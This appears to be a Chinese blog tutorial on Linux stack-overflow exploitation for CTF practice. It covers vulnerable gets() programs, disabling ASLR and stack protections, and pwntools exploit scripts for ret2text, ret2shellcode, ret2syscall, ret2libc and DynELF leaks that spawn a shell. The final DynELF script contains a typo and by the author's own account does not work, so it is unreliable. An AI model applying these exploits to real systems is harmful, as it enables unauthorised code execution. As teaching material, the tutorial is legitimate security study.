---
title: Linux Pwn-缓冲区溢出利用
date: 2019-07-16 17:11:42
tags:
- linux
- pwn
- 栈溢出
categories:
- Pwn二进制漏洞
---
之前介绍了Windows x86平台下栈溢出漏洞的开放与利用，鉴于CTF基本都是Linux，还有实际开发环境，很多智能设备的系统都是基于Linux，所以从很现实的需求出发，一定要学习学习Linux下漏洞的分析。

**ref：**
> CTF-WIKI：https://ctf-wiki.github.io/ctf-wiki/pwn/readme-zh/
> 蒸米大佬的一步一步学rop http://www.anquan.us/static/drops/tips-6597.html
> https://bbs.pediy.com/thread-221734.htm

**工具：**
> objdump、ldd、ROPgadget、readelf、https://ctf-wiki.github.io/ctf-tools/
> https://github.com/ctf-wiki/ctf-challenges

# 0x00 Control Flow hijack

和Windows一样，栈溢出的根本原因在于当前计算机的体系结构没有区分代码段和数据段，因此我们可以通过修改数据段的内容（返回地址），改变程序的执行流程，从而达到程序流劫持的效果。
改变计算机体系来规避漏洞目前是不可能的，防御者为了应对这种攻击，提出了各种增大攻击难度的措施（没有绝对安全的系统），最常见的有：DEP堆栈不可执行、ASLR内存地址随机化、GS/Canary栈保护等。
我们从最简单的入手，不开启任何防护，先了解栈溢出的基本操作，然后逐步增加防御措施。

## 寻找危险函数
这里有一个漏洞程序
```
#include <stdio.h>
#include <string.h>
void success() { puts("You Hava already controlled it."); }
void vulnerable() {
  char s[12];
  gets(s);
  puts(s);
  return;
}
int main(int argc, char **argv) {
  vulnerable();
  return 0;
}
```
当我们看到gets时就应该知道如何入手了，这是一个非常危险的函数，无条件的接受任意大的字符串。
历史上，莫里斯蠕虫第一种蠕虫病毒就利用了 gets 这个危险函数实现了栈溢出。
先进行编译，关闭防御措施：
```
$ gcc -m32 -no-pie -fno-stack-protector -z execstack stack1.c -o stack1
stack1.c: In function ‘vulnerable’:
stack1.c:6:3: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
   gets(s);
   ^~~~
   fgets
/tmp/ccUuPrSy.o: In function `vulnerable':
stack1.c:(.text+0x45): warning: the `gets' function is dangerous and should not be used.
```
编译器都会提示你，gets不要再用了。-fno-stack-protector 和-z execstack分便会关掉栈保护的DEP.-no-PIE关闭 PIE（Position Independent Executable），避免加载基址被打乱。接下来关闭整个linux系统的ASLR保护：
```
$ su
Password:
root@ubuntu:/home/han/ck/pwn/linux/stack_demo# echo 0 > /proc/sys/kernel/randomize_va_space
root@ubuntu:/home/han/ck/pwn/linux/stack_demo# exit
exit
```
## 计算溢出点的位置
什么是溢出点的位置：从缓冲区到覆盖返回地址所需要的字节数
我们同样也可以使用工具pattern_create和pattern_offset来计算，这里我们先手动计算：
把stack1拖入IDA进行反汇编分析：
```
int vulnerable()
{
  char s; // [sp+4h] [bp-14h]@1

  gets(&s);
  return puts(&s);
}
```
在伪代码窗口，我们可看到变量s和bp的距离为14h，再加上old bp的4字节，到ret的距离就是18h。
```
                          +-----------------+
                          |     retaddr     |
                          +-----------------+
                          |     saved ebp   |
                   ebp--->+-----------------+
                          |                 |
                          |                 |
                          |                 |
                          |                 |
                          |                 |
                          |                 |
             s,ebp-0x14-->+-----------------+
```


## 劫持ret的地址
这里我们想让程序跳转到success()，从IDA直接可以获取0x08048456
```
.text:08048456 success         proc near
.text:08048456
.text:08048456 var_4           = dword ptr -4
.text:08048456
.text:08048456                 push    ebp
.text:08048457                 mov     ebp, esp
.text:08048459                 push    ebx
.text:0804845A                 sub     esp, 4
.text:0804845D                 call    __x86_get_pc_thunk_ax
.text:08048462                 add     eax, 1B9Eh
.text:08048467                 sub     esp, 0Ch
.text:0804846A                 lea     edx, (aYouHavaAlready - 804A000h)[eax] ; "You Hava already controlled it."
.text:08048470                 push    edx             ; s
.text:08048471                 mov     ebx, eax
.text:08048473                 call    _puts
.text:08048478                 add     esp, 10h
.text:0804847B                 nop
.text:0804847C                 mov     ebx, [ebp+var_4]
.text:0804847F                 leave
.text:08048480                 retn
.text:08048480 success         endp
```
那么如果我们构造的字符串为：
```
0x18*'a'+success_addr
```
这样就会将retaddr覆盖巍峨哦success_addr,此时栈结构为：
```
                  +-----------------+
                  |    0x0804843B   |
                  +-----------------+
                  |       aaaa      |
           ebp--->+-----------------+
                  |                 |
                  |                 |
                  |                 |
                  |                 |
                  |                 |
                  |                 |
     s,ebp-0x14-->+-----------------+
```

## pwn测试
使用pwntools，怎么使用，以具体的exp来介绍，比如stack1的exp如下：
```
from pwn import *

p = process('./stack1')
ret_addr = 0x08048456
offset = 0x18

payload = 'A' * offset + p32(ret_addr)
print(ret_addr,p32(ret_addr))

p.sendline(payload)
p.interactive()

```
> 1. 连接
> 本地process(),远程remote()
> 2. 数据处理
> p32、p64是打包（转换成二进制），u32、u64是解包
> 3. IO模块
> send(data) : 发送数据
> sendline(data) : 发送一行数据，相当于在末尾加\n
> interactive() : 与shell交互

执行exp：
```
$ python stack1.py
[+] Starting local process './stack1': pid 8328
(134513750, 'V\x84\x04\x08')
[*] Switching to interactive mode
AAAAAAAAAAAAAAAAAAAAAAAAV\x84\x0
You Hava already controlled it.
[*] Got EOF while reading in interactive
$  
```

-------------

# 0X01 ret2shellcode
## 原理
ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。

在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限(NX disabled)。

## 检查保护情况
```
$ checksec ret2shellcode
[*] '/home/han/ck/pwn/linux/re2shellcode/ret2shellcode'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments

$ cat /proc/sys/kernel/randomize_va_space
0
```
可以看出源程序几乎没有开启任何保护，并且有可读，可写，可执行段。

## 查看危险函数
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("No system for you this time !!!");
  gets((char *)&v4);
  strncpy(buf2, (const char *)&v4, 0x64u);
  printf("bye bye ~");
  return 0;
}
```
可以看到，漏洞函数依然还是gets，不过这次还把v4复制到了buf2处。
```
.bss:0804A080                 public buf2
.bss:0804A080 ; char buf2[100]
```
通过`sudo cat /proc/[pid]/maps`查看,会发现buf2和stack都是rwx的。

## 计算溢出点
可以看到该字符串是通过相对于 esp 的索引，所以我们需要进行调试，将断点下在 call gets处，查看 esp，ebp
```
[----------------------------------registers-----------------------------------]
EAX: 0xffffc99c --> 0xf7ffd000 --> 0x26f34
EBX: 0x0
ECX: 0xf7fb2dc7 --> 0xfb38900a
EDX: 0xf7fb3890 --> 0x0
ESI: 0xf7fb2000 --> 0x1d4d6c
EDI: 0x0
EBP: 0xffffca08 --> 0x0
ESP: 0xffffc980 --> 0xffffc99c --> 0xf7ffd000 --> 0x26f34
EIP: 0x8048593 (<main+102>:	call   0x80483d0 <gets@plt>)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048587 <main+90>:	call   0x80483e0 <puts@plt>
   0x804858c <main+95>:	lea    eax,[esp+0x1c]
   0x8048590 <main+99>:	mov    DWORD PTR [esp],eax
=> 0x8048593 <main+102>:	call   0x80483d0 <gets@plt>
   0x8048598 <main+107>:	mov    DWORD PTR [esp+0x8],0x64
   0x80485a0 <main+115>:	lea    eax,[esp+0x1c]
   0x80485a4 <main+119>:	mov    DWORD PTR [esp+0x4],eax
   0x80485a8 <main+123>:	mov    DWORD PTR [esp],0x804a080
Guessed arguments:
arg[0]: 0xffffc99c --> 0xf7ffd000 --> 0x26f34
[------------------------------------stack-------------------------------------]
0000| 0xffffc980 --> 0xffffc99c --> 0xf7ffd000 --> 0x26f34
0004| 0xffffc984 --> 0x0
0008| 0xffffc988 --> 0x1
0012| 0xffffc98c --> 0x0
0016| 0xffffc990 --> 0x0
0020| 0xffffc994 --> 0xc30000
0024| 0xffffc998 --> 0x0
0028| 0xffffc99c --> 0xf7ffd000 --> 0x26f34
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08048593 in main () at ret2shellcode.c:14
14	ret2shellcode.c: No such file or directory.
```

可以看到 esp 为 0xffffc980，ebp 为0xffffca08，同时 v4 相对于 esp 的索引为 [esp+0x1c]，所以，v4 的地址为 0xffffc99c，所以 s 相对于 ebp 的偏移为 0x6C，所以相对于返回地址的偏移为 0x6c+4。

## 劫持ret的地址
这次我们想要程序执行shellcode，那么我们可以把shellcode放在任何可执行的位置，比如buf2或栈上，位置的地址就是我们需要覆盖ret_addr的值

## pwn测试
控制程序执行bss段的shellcode
```
from pwn import *

p = process('./ret2shellcode')

ret_addr = 0x0804A080
offset = 0x6c + 4

shellcode = asm(shellcraft.i386.linux.sh())
payload = shellcode.ljust(offset,'a') + p32(ret_addr)
#payload = shellcode + 'a'*(offset - len(shellcode)) + p32(ret_addr)

p.sendline(payload)
p.interactive()
```

> 1. Shellcode生成器
> 使用shellcraft可以生成对应的架构的shellcode代码，直接使用链式调用的方法就可以得到
> 如32位linux：shellcraft.i386.linux.sh()
> shellcode.ljust(offset,'a')在shellcode后面填充offset - len(shellcode)长度的字符‘a’
>
> 2. 汇编与反汇编
> 使用asm来进行汇编，使用disasm进行反汇编
> 指定cpu类型以及操作系统：asm('nop', arch='arm'，os = 'linux'，endian = 'little'，word_size = 32)

-----------

# 0x02 ret2text
## 原理
ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。

ROP不需要去执行栈中的shellcode，因此可以绕过DEP保护

## 检查保护
```
$ checksec ret2text
[*] '/home/han/ck/pwn/linux/ret2text/ret2text'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
开启了DEP，问题不大，因为执行的已有的代码

## 检查危险函数
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("There is something amazing here, do you know anything?");
  gets((char *)&v4);
  printf("Maybe I will tell you next time !");
  return 0;
}
```
同样还是gets函数

## 计算偏移
和上一个一样，0x6c+4

## 寻找跳板
在代码段发现调用 system("/bin/sh") 的代码，那么直接将ret覆盖为0804863A就能拿到shell
```
.text:0804862D                 call    ___isoc99_scanf
.text:08048632                 mov     eax, [ebp+input]
.text:08048635                 cmp     eax, [ebp+secretcode]
.text:08048638                 jnz     short locret_8048646
.text:0804863A                 mov     dword ptr [esp], offset command ; "/bin/sh"
.text:08048641                 call    _system
.text:08048646
```

## 测试
```
from pwn import *

p = process('./ret2text')
ret_add = 0x0804863A
offset = 0x6c + 4

payload = 'A'*offset + p32(ret_add)
print(p32(ret_add))

p.sendline(payload)

p.interactive()
```

-----------

# 0x03 ret2syscall
## 原理
ret2syscall，即控制程序执行系统调用，获取 shell。上一个可以在代码段找到system('/bin/sh'),
如果没法找到的话，我们就得自己去构造系统调用
简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell
`execve("/bin/sh",NULL,NULL)`
其中，该程序是 32 位，所以我们需要使得
```
系统调用号，即 eax 应该为 0xb
第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。
第二个参数，即 ecx 应该为 0
第三个参数，即 edx 应该为 0

```

## 获取跳板
那么我们如何去控制这4个寄存器的值，我们现在修改的只有栈中的数据，这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。
首先，我们来寻找控制 eax 的 gadgets
```
$ ROPgadget --binary ret2syscall --only 'pop|ret'|grep eax
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080bb196 : pop eax ; ret
0x0807217a : pop eax ; ret 0x80e
0x0804f704 : pop eax ; ret 3
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
```

类似的，我们可以得到控制其它寄存器的 gadgets
```
$ ROPgadget --binary ret2syscall --only 'pop|ret'|grep ebx
0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
0x080be23f : pop ebx ; pop edi ; ret
0x0806eb69 : pop ebx ; pop edx ; ret
0x08092258 : pop ebx ; pop esi ; pop ebp ; ret
0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10
0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14
0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4
0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8
0x08048913 : pop ebx ; pop esi ; pop edi ; ret
0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4
0x08049a94 : pop ebx ; pop esi ; ret
0x080481c9 : pop ebx ; ret
0x080d7d3c : pop ebx ; ret 0x6f9
0x08099c87 : pop ebx ; ret 8
0x0806eb91 : pop ecx ; pop ebx ; ret
0x0806336b : pop edi ; pop esi ; pop ebx ; ret
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret
0x0805c820 : pop esi ; pop ebx ; ret
0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0807b6ed : pop ss ; pop ebx ; ret
```

现在，我们就得到了可以控制4个寄存器的地址：
`0x080bb196 : pop eax ; ret`
`0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret`

另外，我们要向ebx写入'/bin/sh'，同时执行int 80
所以要搜索，看看程序中有没有
```
$ ROPgadget --binary ret2syscall --only int
Gadgets information
============================================================
0x08049421 : int 0x80
0x080938fe : int 0xbb
0x080869b5 : int 0xf6
0x0807b4d4 : int 0xfc

Unique gadgets found: 4
```

```
$ ROPgadget --binary ret2syscall --string '/bin/sh'
Strings information
============================================================
0x080be42c : /bin/sh
```

## 测试
```python
from pwn import *

p = process('./ret2syscall')
offset = 0x6c + 4

pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
binsh = 0x080be408
int_0x80 = 0x08049421

payload = 'A'*offset + p32(pop_eax_ret) + p32(0xb) + p32(pop_edx_ecx_ebx_ret) + p32(0) + p32(0) + p32(binsh) + p32(int_0x80)


payload = flat('A'*offset , pop_eax_ret , 0xb , pop_edx_ecx_ebx_ret , 0 , 0 , binsh,int_0x80)
print(payload)

p.sendline(payload)

p.interactive()

```
> 1. flat()
> 在pwntools中可以用flat()來构造rop，参数传递用list來传，list中的element为想串接的rop gadget地址，简单来说就是可以把：rop = p32(gadget1) + p32(gadget2) + p32(gadget3) ......变成这样表示：flat([gadget1,gadget2,gadget3,......])

-------------

# 0x04 ret2libc
## 原理
我们知道程序调用了libc.so，并且libc.so里保存了大量可利用的函数，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system()这个函数的地址以及”/bin/sh”这个字符串的地址，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)

## 1. 程序中有system和'/bin/sh'

### 检查保护
```
$ checksec ret2libc1
[*] '/home/han/ck/pwn/linux/ret2libc/ret2libc1'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

### 确定漏洞位置
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("RET2LIBC >_<");
  gets((char *)&v4);
  return 0;
}
```

### 计算偏移

### 寻找跳板
1. system_plt
```
.plt:08048460 _system         proc near               ; CODE XREF: secure+44p
.plt:08048460                 jmp     ds:off_804A018
.plt:08048460 _system         endp
```
2. 'binsh'
```
$ ROPgadget --binary ret2libc1 --string '/bin/sh'
Strings information
============================================================
0x08048744 : /bin/sh
```

### pwn测试
```python
from pwn import *

p = process('./ret2libc1')

offset =112
binsh = 0x08048720
system_plt = 0x08048460
fake_ret = 'bbbb'

payload = flat(['a'*offset,system_plt,fake_ret,binsh])

p.sendline(payload)
p.interactive()
```

fake_ret是调用system之后的返回地址，binsh就是system的参数

## 2. 没有binsh
需要我们自己来读取字符串，所以我们需要两个 gadgets，第一个控制程序读取字符串，使用gets将'/bin/sh'写入程序某个位置，第二个控制程序执行 system("/bin/sh")。

我们在.bss段发现了未利用的buf2，可以把binsh写入buf2
```
.bss:0804A080                 public buf2
.bss:0804A080 ; char buf2[100]
.bss:0804A080 buf2            db 64h dup(?)
.bss:0804A080 _bss            ends
```
```
from pwn import *

p = process('./ret2libc2')

gets_plt = 0x08048460
pop_ebx = 0x0804843d
system_plt = 0x08048490
buf2_add = 0x804a080

payload = flat(['a'*112,gets_plt,pop_ebx,buf2_add,system_plt,0xdeadbeef,buf2_add])

p.sendline(payload)
p.sendline('/bin/sh')
p.interactive()
```
buf2_add是gets的参数，pop_ebx将gets返回后的堆栈平衡，移交控制权给system

## 3. 两个都没有&无ASLR
程序中两个都没有，但是我们可以利用libc中的system和'/bin/sh'
```
$ checksec ret2libc3
[*] '/home/han/ck/pwn/linux/ret2libc/ret2libc3'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
### 寻找跳板
这时候我们可以使用gdb进行调试。然后通过print和find命令来查找system和”/bin/sh”字符串的地址。
我们首先在main函数上下一个断点，然后执行程序，这样的话程序会加载libc.so到内存中，然后我们就可以通过”print system”这个命令来获取system函数在内存中的位置，随后我们可以通过” print __libc_start_main”这个命令来获取libc.so在内存中的起始位置，接下来我们可以通过find命令来查找”/bin/sh”这个字符串。这样我们就得到了system的地址0xf7e19d10以及"/bin/sh"的地址0xf7f588cf。
```
Breakpoint 1, main () at ret2libcGOT.c:20
20	ret2libcGOT.c: No such file or directory.
gdb-peda$ print system
$1 = {<text variable, no debug info>} 0xf7e19d10 <system>
gdb-peda$ print __libc_start_main
$2 = {<text variable, no debug info>} 0xf7df5d90 <__libc_start_main>
gdb-peda$ find 0xf7df5d90,+2200000,"/bin/sh"
Searching for '0xf7df5d90,+2200000,/bin/sh' in: None ranges
Search for a pattern in memory; support regex search
Usage:
    searchmem pattern start end
    searchmem pattern mapname

gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f588cf ("/bin/sh")
```

### 测试
```
from pwn import *

p = process('./ret2libc3')

offset = 112
system_addr = 0xf7e19d10
binsh = 0xf7f588cf

payload = flat(['a'*112,system_addr,0xdeabeef,binsh])

p.sendline(payload)
p.interactive()
```
------------

## 4. 两个都没有&有ASLR
通过`sudo cat /proc/[pid]/maps`或者`ldd`查看，你会发现libc.so地址每次都是变化的
```
$ ldd ret2libc3
	linux-gate.so.1 (0xf7f43000)
	libc.so.6 => /lib32/libc.so.6 (0xf7d4c000)
	/lib/ld-linux.so.2 (0xf7f45000)

han at ubuntu in ~/ck/pwn/linux/ret2libc
$ ldd ret2libc3
	linux-gate.so.1 (0xf7f96000)
	libc.so.6 => /lib32/libc.so.6 (0xf7d9f000)
	/lib/ld-linux.so.2 (0xf7f98000)
```
那么如何解决地址随机化的问题呢？思路是：我们需要先泄漏出libc.so某些函数在内存中的地址，然后再利用泄漏出的函数地址根据偏移量计算出system()函数和/bin/sh字符串在内存中的地址，然后再执行我们的ret2libc的shellcode。既然栈，libc，heap的地址都是随机的。我们怎么才能泄露出libc.so的地址呢？方法还是有的，因为程序本身在内存中的地址并不是随机的，如图所示：

![](https://res.cloudinary.com/dozyfkbg3/image/upload/v1563267241/pwn/4a7227aa9f00bd2fd45d363da4cf25c6fd425638.jpg)
也就是说程序内存映像是没有随机的


首先我们利用`objdump`来查看可以利用的plt函数和函数对应的got表：
```
$ objdump  -d -j  .plt ./ret2libc3

./ret2libc3:     file format elf32-i386


Disassembly of section .plt:

08048420 <.plt>:
 8048420:	ff 35 04 a0 04 08    	pushl  0x804a004
 8048426:	ff 25 08 a0 04 08    	jmp    *0x804a008
 804842c:	00 00                	add    %al,(%eax)
	...

08048430 <printf@plt>:
 8048430:	ff 25 0c a0 04 08    	jmp    *0x804a00c
 8048436:	68 00 00 00 00       	push   $0x0
 804843b:	e9 e0 ff ff ff       	jmp    8048420 <.plt>

08048440 <gets@plt>:
 8048440:	ff 25 10 a0 04 08    	jmp    *0x804a010
 8048446:	68 08 00 00 00       	push   $0x8
 804844b:	e9 d0 ff ff ff       	jmp    8048420 <.plt>

08048450 <time@plt>:
 8048450:	ff 25 14 a0 04 08    	jmp    *0x804a014
 8048456:	68 10 00 00 00       	push   $0x10
 804845b:	e9 c0 ff ff ff       	jmp    8048420 <.plt>

08048460 <puts@plt>:
 8048460:	ff 25 18 a0 04 08    	jmp    *0x804a018
 8048466:	68 18 00 00 00       	push   $0x18
 804846b:	e9 b0 ff ff ff       	jmp    8048420 <.plt>

08048470 <__gmon_start__@plt>:
 8048470:	ff 25 1c a0 04 08    	jmp    *0x804a01c
 8048476:	68 20 00 00 00       	push   $0x20
 804847b:	e9 a0 ff ff ff       	jmp    8048420 <.plt>

08048480 <srand@plt>:
 8048480:	ff 25 20 a0 04 08    	jmp    *0x804a020
 8048486:	68 28 00 00 00       	push   $0x28
 804848b:	e9 90 ff ff ff       	jmp    8048420 <.plt>

08048490 <__libc_start_main@plt>:
 8048490:	ff 25 24 a0 04 08    	jmp    *0x804a024
 8048496:	68 30 00 00 00       	push   $0x30
 804849b:	e9 80 ff ff ff       	jmp    8048420 <.plt>

080484a0 <setvbuf@plt>:
 80484a0:	ff 25 28 a0 04 08    	jmp    *0x804a028
 80484a6:	68 38 00 00 00       	push   $0x38
 80484ab:	e9 70 ff ff ff       	jmp    8048420 <.plt>

080484b0 <rand@plt>:
 80484b0:	ff 25 2c a0 04 08    	jmp    *0x804a02c
 80484b6:	68 40 00 00 00       	push   $0x40
 80484bb:	e9 60 ff ff ff       	jmp    8048420 <.plt>

080484c0 <__isoc99_scanf@plt>:
 80484c0:	ff 25 30 a0 04 08    	jmp    *0x804a030
 80484c6:	68 48 00 00 00       	push   $0x48
 80484cb:	e9 50 ff ff ff       	jmp    8048420 <.plt>


$ objdump  -R ret2libc3

ret2libc3:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049ffc R_386_GLOB_DAT    __gmon_start__
0804a040 R_386_COPY        stdin@@GLIBC_2.0
0804a060 R_386_COPY        stdout@@GLIBC_2.0
0804a00c R_386_JUMP_SLOT   printf@GLIBC_2.0
0804a010 R_386_JUMP_SLOT   gets@GLIBC_2.0
0804a014 R_386_JUMP_SLOT   time@GLIBC_2.0
0804a018 R_386_JUMP_SLOT   puts@GLIBC_2.0
0804a01c R_386_JUMP_SLOT   __gmon_start__
0804a020 R_386_JUMP_SLOT   srand@GLIBC_2.0
0804a024 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
0804a028 R_386_JUMP_SLOT   setvbuf@GLIBC_2.0
0804a02c R_386_JUMP_SLOT   rand@GLIBC_2.0
0804a030 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7

```

思路：通过puts@plt打印出__libc_start_main在内存中的地址，也就是__libc_start_main@got。
既然puts()函数实现是在libc.so当中，那我们调用的puts@plt()函数为什么也能实现puts()功能呢? 这是因为linux采用了**延时绑定技术**，当我们调用puts@plt()的时候，系统会将真正的puts()函数地址link到got表的puts.got中，然后puts@plt()会根据puts.got 跳转到真正的puts()函数上去。
由于 libc 的延迟绑定机制，我们需要泄漏**已经执行过的函数的地址**。这里我们泄露 libc_start_main 的地址，这是因为它是程序**最初被执行**的地方。

使用ldd命令可以查看目标程序调用的so库。随后我们把libc.so拷贝到当前目录，因为我们的exp需要这个so文件来计算相对地址：
```
$ ldd ret2libc3
	linux-gate.so.1 (0xf7f6b000)
	libc.so.6 => /lib32/libc.so.6 (0xf7d74000)
	/lib/ld-linux.so.2 (0xf7f6d000)

han at ubuntu in ~/ck/pwn/linux/ret2libc
$ cp /lib32/libc.so.6  libc.so

```

### pwn测试
```
from pwn import *
from LibcSearcher import LibcSearcher

p = process('./ret2libc3')
elf = ELF('./ret2libc3')
libc = ELF('./libc.so')

puts_plt = elf.plt['puts']
libc_start_main_got =elf.got['__libc_start_main']
main = elf.symbols['main']

print("leak libc_start_main_got addr and return to main again")
payload = flat(['a'*112],puts_plt,main,libc_start_main_got)
p.sendlineafter('Can you find it !?',payload)

print("receiving libc_start_main_got")
libc_start_main_addr = u32(p.recv(4))
print('libc_start_main_addr = ' + hex(libc_start_main_addr))

print("calculating system() addr and \"/bin/sh\" addr")
system_addr = libc_start_main_addr + (libc.symbols['system']-libc.symbols['__libc_start_main'])
print('system_addr= ' + hex(system_addr))
binsh_addr = libc_start_main_addr + (next(libc.search('/bin/sh'))-libc.symbols['__libc_start_main'])
print('binsh_addr= ' + hex(binsh_addr))

print("get shell")

print(p32(system_addr),p32(binsh_addr))
payload = flat(['a'*104,system_addr,0xdeadbeef,binsh_addr])
p.sendline(payload)
p.interactive()
```

> 1. ELF模块
> ELF模块用于获取ELF文件的信息，首先使用ELF()获取这个文件的句柄，然后使用这个句柄调用函数，和IO模块很相似。
> 下面演示了：获取基地址、获取函数地址（基于符号）、获取函数got地址、获取函数plt地址
> ```
> >>> e = ELF('/bin/cat')
> >>> print hex(e.address)  # 文件装载的基地址
> 0x400000
> >>> print hex(e.symbols['write']) # 函数地址
> 0x401680
> >>> print hex(e.got['write']) # GOT表的地址
> 0x60b070
> >>> print hex(e.plt['write']) # PLT的地址
> 0x401680
> ```


如果无法直接知道对方所使用的操作系统及libc的版本而苦恼，常规方法就是挨个把常见的Libc.so从系统里拿出来，与泄露的地址对比一下最后12位，从而获取版本
github上面有个库可以参考：
https://github.com/lieanu/LibcSearcher
```
from LibcSearcher import *

#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型
obj = LibcSearcher("fgets", 0X7ff39014bd90)

obj.dump("system")        #system 偏移
obj.dump("str_bin_sh")    #/bin/sh 偏移
obj.dump("__libc_start_main_ret")   
```

---------------

# 0x05 Memory Leak & DynELF - 在不获取目标libc.so的情况下进行ROP攻击
参考的是蒸米的exp，但是用的不是他的示例程序，而是ret2libc3。
他的方法是通过write@plt泄露内存，然后寻找system函数。然后使用read@plt将'/bin/sh'写入.bss段，然后通过pppr移交控制权给system()
ret2libc3的不同之处在于，没有write和read，不过没有关系，使用puts@plt和gets@plt也可以实现嘛，但是难就难在，虽然puts@plt只有一个参数，但是它有着遇到'\x00'就截断并在后面填充'\n'的“好”习惯，所以泄露出来的数据还需要处理。可以参考下面这两篇：
https://www.anquanke.com/post/id/85129
http://uprprc.club/2016/09/07/pwntools-dynelf.html

```python
from pwn import *

p = process('./ret2libc3')
elf = ELF('./ret2libc3')

plt_puts = elf.symbols['puts']
main = elf.symbols['main']
plt_gets = elf.symbols['gets']
start_addr = elf.symbols['_start']

def leak(address):
    global i
    count = 0
    content = ''
    x = p.recvuntil('!?')
    payload1 = '\x90'*112 + p32(plt_puts) + p32(main) + p32(address)
    p.sendline(payload1)
    up = ""
    while True:
          c = p.recv(1)
          count += 1
          if up == '\n' and c == 'N':
                 print((content).encode('hex'))
                 content =content[:-1]+'\x00'
                 break
          else:
                 content += c
                 up = c
    content = content[:4]

    # content = p.recvuntil('\nN',True)
    # print(content)
    # if not content:
    #     content = '\x00'
    # else:
    #     content = content[:4]

    print("%#x => %s" %(address, (content or '').encode('hex')))
    return content

d = DynELF(leak,elf = ELF('./ret2libc3'))

system_addr = d.lookup('system','libc')
print("system address = " + hex(system_addr))

bss_addr = 0x0804a040
pr = 0x0804841d

payload2 = flat(['a'*112,plt_gets,pr,bss_addr,sytem_addr,main,bss_addr])

print("###sending payload2####")
p.sendline(payload2)
p.sendline("/bin/sh\0")

p.interactive()

```

这段代码在泄露第一个数据之后就失败了，我调试了好久，最后才想起来，`payload1 = '\x90'*112 + p32(plt_puts) + p32(main) + p32(address)`这里如果使用的是main，那么堆栈就会不平衡，导致溢出点变化（参见之前从112变成104）。但是如果改成返回到start_addr，泄露的数据就会更多（虽然还是没有成功）。
一个事实是汇编程序的入口是_start，而C程序的入口是main函数
> 执行的流程是：
> GCC将你的程序同crtbegin.o/crtend.o/gcrt1.o一块进行编译。其它默认libraries会被默认动态链接。可执行程序的开始地址被设置为_start。
